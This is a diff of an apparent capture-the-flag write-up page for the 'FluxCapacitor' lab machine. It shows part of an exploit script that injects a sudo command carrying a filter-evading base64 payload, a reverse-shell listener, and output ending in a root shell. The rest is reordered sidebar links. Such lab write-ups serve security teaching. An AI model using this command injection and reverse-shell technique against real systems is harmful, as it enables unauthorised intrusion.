         <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/sync&#34;</span>
         <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="s2">&#34;opt=&#39; sudo /home/themiddle/.monit cmd &#34;</span><span class="o">+</span><span class="n">encoded_payload</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;STATUS CODE: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;STATUS CODE: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
     <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
         <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
     <span class="k">finally</span><span class="p">:</span>
@@ -634,21 +650,22 @@ bdc89b40eda244649072189a8438b30e</code></pre></div></p>
 <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
     <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
 <span class="n">shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
-<span class="k">if</span> <span class="n">shell</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+<span class="k">if</span> <span class="n">shell</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
     <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
     <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 <span class="n">shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span></code></pre></div></p>
 
 <p>Let&rsquo;s run it:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ python2 autopwn_flux.py 
-[*] http://10.10.10.69:80/sync?opt=&#39; sudo /home/themiddle/.monit cmd L\3\V\z\c\i\9\i\a\W\4\v\c\H\l\0\a\G\9\u\M\y\A\t\Y\y\A\i\a\W\1\w\b\3\J\0\I\G\9\z\L\H\B\0\e\S\x\z\b\2\N\r\Z\X\Q\7\c\z\1\z\b\2\N\r\Z\X\Q\u\c\2\9\j\a\2\V\0\K\H\N\v\Y\2\t\l\d\C\5\B\R\l\9\J\T\k\V\U\L\H\N\v\Y\2\t\l\d\C\5\T\T\0\N\L\X\1\N\U\U\k\V\B\T\S\k\7\c\y\5\j\b\2\5\u\Z\W\N\0\K\C\g\n\M\T\A\u\M\T\A\u\M\T\Q\u\N\D\M\n\L\D\Y\w\M\D\A\x\K\S\k\7\b\3\M\u\Z\H\V\w\M\i\h\z\L\m\Z\p\b\G\V\u\b\y\g\p\L\D\A\p\O\2\9\z\L\m\R\1\c\D\I\o\c\y\5\m\a\W\x\l\b\m\8\o\K\S\w\x\K\T\t\v\c\y\5\k\d\X\A\y\K\H\M\u\Z\m\l\s\Z\W\5\v\K\C\k\s\M\i\k\7\b\3\M\u\c\H\V\0\Z\W\5\2\K\C\d\I\S\V\N\U\R\k\l\M\R\S\c\s\J\y\9\k\Z\X\Y\v\b\n\V\s\b\C\c\p\O\3\B\0\e\S\5\z\c\G\F\3\b\i\h\b\J\y\9\i\a\W\4\v\Y\m\F\z\a\C\c\s\J\y\1\p\J\1\0\p\O\3\M\u\Y\2\x\v\c\2\U\o\K\T\t\l\e\G\l\0\K\C\k\7\I\g\=\=&#39;
-[+] Trying to bind to 0.0.0.0 on port 60001: Done
-[*] I am sending the encoded payload for you...
-[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.69 on port 49114
-[*] Switching to interactive mode
-root@fluxcapacitor:/# $ whoami
-root</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>python2 autopwn_flux.py 
+<span class="go">[*] http://10.10.10.69:80/sync?opt=&#39; sudo /home/themiddle/.monit cmd L\3\V\z\c\i\9\i\a\W\4\v\c\H\l\0\a\G\9\u\M\y\A\t\Y\y\A\i\a\W\1\w\b\3\J\0\I\G\9\z\L\H\B\0\e\S\x\z\b\2\N\r\Z\X\Q\7\c\z\1\z\b\2\N\r\Z\X\Q\u\c\2\9\j\a\2\V\0\K\H\N\v\Y\2\t\l\d\C\5\B\R\l\9\J\T\k\V\U\L\H\N\v\Y\2\t\l\d\C\5\T\T\0\N\L\X\1\N\U\U\k\V\B\T\S\k\7\c\y\5\j\b\2\5\u\Z\W\N\0\K\C\g\n\M\T\A\u\M\T\A\u\M\T\Q\u\N\D\M\n\L\D\Y\w\M\D\A\x\K\S\k\7\b\3\M\u\Z\H\V\w\M\i\h\z\L\m\Z\p\b\G\V\u\b\y\g\p\L\D\A\p\O\2\9\z\L\m\R\1\c\D\I\o\c\y\5\m\a\W\x\l\b\m\8\o\K\S\w\x\K\T\t\v\c\y\5\k\d\X\A\y\K\H\M\u\Z\m\l\s\Z\W\5\v\K\C\k\s\M\i\k\7\b\3\M\u\c\H\V\0\Z\W\5\2\K\C\d\I\S\V\N\U\R\k\l\M\R\S\c\s\J\y\9\k\Z\X\Y\v\b\n\V\s\b\C\c\p\O\3\B\0\e\S\5\z\c\G\F\3\b\i\h\b\J\y\9\i\a\W\4\v\Y\m\F\z\a\C\c\s\J\y\1\p\J\1\0\p\O\3\M\u\Y\2\x\v\c\2\U\o\K\T\t\l\e\G\l\0\K\C\k\7\I\g\=\=&#39;
+</span><span class="go">[+] Trying to bind to 0.0.0.0 on port 60001: Done
+</span><span class="go">[*] I am sending the encoded payload for you...
+</span><span class="go">[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.69 on port 49114
+</span><span class="go">[*] Switching to interactive mode
+</span><span class="go">root@fluxcapacitor:/# $ whoami
+</span><span class="go">root
+</span></code></pre></div></div></p>
 
 <p>As you see, I escape every single character in the base64-encoded command argument. I do this to avoid being blocked by some filtering rule that will match some random combination of letters. You can download the script here: <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/FluxCapacitor/autopwn_flux.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/FluxCapacitor/autopwn_flux.py</a></p>
 
@@ -693,17 +710,53 @@ root</code></pre></div></p>
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
     </footer>
   </a>
 </article>
@@ -757,57 +810,21 @@ root</code></pre></div></p>
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -869,6 +886,102 @@ root</code></pre></div></p>
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
@@ -917,442 +1030,6 @@ root</code></pre></div></p>
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/rold/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
-      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">16 Aug 2015</time>
-      <time lang="el">16 Αυγ 2015</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Unattended write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Aug 2019</time>
-      <time lang="el">23 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
           
            
            
@@ -1365,41 +1042,9 @@ root</code></pre></div></p>
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
           
-           
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1465,6 +1110,190 @@ root</code></pre></div></p>
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/matchsticks/" class="clearfix">
     <div class="cell">
@@ -1480,6 +1309,230 @@ root</code></pre></div></p>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Unattended write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Aug 2019</time>
+      <time lang="el">23 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1533,75 +1586,51 @@ root</code></pre></div></p>
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
     </footer>
   </a>
 </article>
 
            
           
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
           
            
            
@@ -1691,153 +1720,6 @@ root</code></pre></div></p>
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reverse shells</h3>
-      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">12 Apr 2018</time>
-      <time lang="el">12 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
-      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Apr 2018</time>
-      <time lang="el">22 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1864,6 +1746,186 @@ root</code></pre></div></p>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
